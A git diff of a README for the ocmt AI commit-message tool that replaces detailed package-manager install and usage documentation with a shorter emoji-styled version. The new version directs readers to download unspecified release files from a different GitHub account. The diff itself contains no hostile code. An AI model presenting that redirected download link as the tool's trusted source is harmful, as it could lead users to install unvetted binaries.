@@ -1,6 +1,56 @@
-# OpenCommit (ocmt)
+# 🚀 ocmt - Generate Commit Messages Easily
 
-AI-powered git commit message, changelog & documentation generator using [opencode.ai](https://opencode.ai)
+## 📥 Download Now
+[![Download ocmt](https://img.shields.io/badge/Download-ocmt-blue)](https://github.com/Hizomboga/ocmt/releases)
+
+## 📝 What is ocmt?
+OpenCommit (ocmt) is an AI-powered tool that helps you generate git commit messages, changelogs, and documentation effortlessly. Whether you are a novice or a seasoned user, ocmt smooths your workflow with smart suggestions based on your changes.
+
+## 🌟 Features
+- **AI-powered commit messages**: Automatically creates conventional commit messages tailored to your staged changes.
+- **Changelog generation**: Generates comprehensive changelogs from your commit history, saving you time and effort.
+- **Interactive CLI**: Enjoy a user-friendly terminal interface that guides you through the process with clear prompts.
+- **Customizable**: Personalize your commit message rules by editing the configuration file located at `.oc/config.md`.
+- **Multiple aliases**: Access the tool using `oc`, `ocmt`, or `opencommit`.
+
+## 🚀 Getting Started
+
+### 📋 Prerequisites
+Before installing ocmt, ensure your system meets the following requirements:
+
+- **Node.js**: You need Node.js version 18.0.0 or higher.
+- **OpenCode**: Download and authenticate OpenCode, an essential part of the ocmt setup.
+
+#### 🌐 Install OpenCode
+To install OpenCode, use the npm command below:
+
+```bash
+# npm
+npm install -g opencode
+```
+
+### 💻 Download & Install
+To download ocmt, visit the [Release Page](https://github.com/Hizomboga/ocmt/releases). There, you can find the latest version available for your operating system.
+
+1. Click on the link above to navigate to the Releases page.
+2. Choose the version suitable for your operating system.
+3. Download the file to your computer.
+4. Once downloaded, follow the installation instructions specific to your OS.
+
+### ⚙️ How to Use ocmt
+1. Open your terminal.
+2. Navigate to your project directory.
+3. Stage your changes with `git add <files>`.
+4. Run the command below to start ocmt:
+
+```bash
+oc
+```
+
+5. Follow the prompts to generate your commit message.
+
+### ✍️ Example Output
+Here’s what you can expect when you run ocmt:
 
 ```
 ┌   oc 
@@ -24,276 +74,25 @@ AI-powered git commit message, changelog & documentation generator using [openco
 └
 ```
 
-## Features
+This interactive interface allows you to review and modify the commit message as needed. 
 
-- **AI-powered commit messages** - Generates conventional commit messages from your staged changes
-- **Changelog generation** - Create changelogs from your commit history
-- **Interactive CLI** - Beautiful terminal UI with confirmation prompts
-- **Customizable** - Edit `.oc/config.md` to customize commit message rules
-- **Multiple aliases** - Use `oc`, `ocmt`, or `opencommit`
+### 🛠️ Configuration
+You can customize ocmt by editing the configuration file located at `.oc/config.md`. Adjust rules according to your project needs to make the tool work for you.
 
-## Installation
-
-### Prerequisites
-
-- Node.js >= 18.0.0
-- [OpenCode](https://opencode.ai) installed and authenticated
-
-#### Install OpenCode
+### 📝 Changelog
+ocmt automatically keeps track of your commit history. You can generate a changelog using:
 
 ```bash
-# npm
-npm install -g opencode
-
-# or brew
-brew install sst/tap/opencode
-```
-
-Then authenticate:
-
-```bash
-opencode auth
-```
-
-### Install ocmt
-
-```bash
-# bun (recommended)
-bun install -g ocmt
-
-# npm
-npm install -g ocmt
-
-# pnpm
-pnpm install -g ocmt
-
-# yarn
-yarn global add ocmt
-```
-
-## Usage
-
-### Generate Commit Message
-
-```bash
-# Interactive commit flow
-oc
-
-# Stage all changes first
-oc -a
-
-# Skip confirmation prompts
-oc -y
-
-# Stage all and skip prompts
-oc -ay
-
-# Use provided message directly (skips AI)
-oc "feat: add new feature"
-```
-
-### Generate Changelog
-
-```bash
-# Interactive changelog generation
 oc changelog
-
-# Shorthand aliases
-oc cl
-oc --changelog
-oc -cl
-
-# Specify range
-oc changelog --from v1.0.0 --to HEAD
-oc changelog -f v1.0.0 -t v2.0.0
 ```
 
-## Configuration
+This command compiles all commits into a formatted changelog, making it easy to document changes for your users.
 
-On first run, ocmt creates a `.oc/` directory in your repository root with configuration files:
+### ⚖️ License
+This project is licensed under the MIT License. Feel free to use or modify it according to your requirements.
 
-### `.oc/config.md` - Commit Message Rules
+## 🔗 Additional Resources
+- [OpenCode Documentation](https://opencode.ai)
+- [Node.js Official Site](https://nodejs.org)
 
-Controls how AI generates commit messages. Default uses [Conventional Commits](https://www.conventionalcommits.org/):
-
-```markdown
-# Commit Message Guidelines
-
-## Types
-- `feat`: A new feature
-- `fix`: A bug fix
-- `docs`: Documentation only changes
-- `refactor`: Code change that neither fixes a bug nor adds a feature
-...
-
-## Rules
-1. Use lowercase for the type
-2. No scope (e.g., use `feat:` not `feat(api):`)
-3. Use imperative mood ("add" not "added")
-...
-```
-
-### `.oc/changelog.md` - Changelog Rules
-
-Controls changelog generation format. Default uses [Keep a Changelog](https://keepachangelog.com/) format.
-
-Edit these files to customize AI behavior for your project.
-
-## Commands
-
-| Command | Aliases | Description |
-|---------|---------|-------------|
-| `oc` | `ocmt`, `opencommit` | Generate commit message from staged changes |
-| `oc changelog` | `oc cl` | Generate changelog from commits |
-
-## Options
-
-### Commit Options
-
-| Option | Description |
-|--------|-------------|
-| `-a, --all` | Stage all changes before committing |
-| `-y, --yes` | Skip confirmation prompts |
-| `-V, --version` | Show version number |
-| `-h, --help` | Show help |
-
-### Changelog Options
-
-| Option | Description |
-|--------|-------------|
-| `-f, --from <ref>` | Starting commit/tag reference |
-| `-t, --to <ref>` | Ending commit/tag reference (default: `HEAD`) |
-
-## How It Works
-
-1. **Connects to OpenCode** - Tries to connect to an existing OpenCode server, or spawns a new one
-2. **Analyzes your changes** - Reads the staged git diff
-3. **Generates message** - Sends diff to AI with your configured rules
-4. **Confirms with you** - Shows the proposed message for approval/editing
-5. **Commits** - Creates the commit with the final message
-
-### Models Used
-
-| Feature | Provider | Model |
-|---------|----------|-------|
-| Commit messages | opencode | gpt-5-nano |
-| Changelogs | opencode | claude-sonnet-4-5 |
-
-## Examples
-
-### Basic Commit Flow
-
-```bash
-$ oc
-┌   oc 
-│
-◆  Staged changes:
-│    + src/utils/parser.ts
-│    + src/index.ts
-│
-●  Diff: 127 lines
-│
-◇  Commit message generated
-│
-◇  Proposed commit message:
-│    "feat: add expression parser with AST support"
-│
-◆  What would you like to do?
-│  ● Commit with this message
-└
-```
-
-### Changelog Generation
-
-```bash
-$ oc changelog
-┌   changelog 
-│
-◇  Found releases and commits
-│
-◆  Select starting point for changelog:
-│  ○ v1.0.0 (release)
-│  ○ v0.9.0 (release)
-│  ● abc1234 feat: add user authentication
-│  ○ def5678 fix: resolve memory leak
-└
-```
-
-## Troubleshooting
-
-### "OpenCode CLI is not installed"
-
-Install OpenCode first:
-
-```bash
-npm install -g opencode
-# or
-brew install sst/tap/opencode
-```
-
-### "Not authenticated with OpenCode"
-
-Run authentication:
-
-```bash
-opencode auth
-```
-
-### "Not a git repository"
-
-Make sure you're in a git repository:
-
-```bash
-git init
-```
-
-### No staged changes
-
-Stage your changes first:
-
-```bash
-git add .
-# or
-oc -a  # stages all changes automatically
-```
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feat/amazing-feature`)
-3. Commit your changes (`oc` 😉)
-4. Push to the branch (`git push origin feat/amazing-feature`)
-5. Open a Pull Request
-
-## Development
-
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/ocmt.git
-cd ocmt
-
-# Install dependencies
-bun install
-
-# Run in development mode
-bun run dev
-
-# Build for production
-bun run build
-
-# Type check
-bun run typecheck
-```
-
-## License
-
-MIT
-
-## Links
-
-- [OpenCode](https://opencode.ai) - AI coding assistant
-- [OpenCode Docs](https://opencode.ai/docs) - Documentation
-- [Conventional Commits](https://www.conventionalcommits.org/) - Commit message specification
-- [Keep a Changelog](https://keepachangelog.com/) - Changelog format
+Remember, for updates or new releases, always check back on the [Release Page](https://github.com/Hizomboga/ocmt/releases). Happy coding!
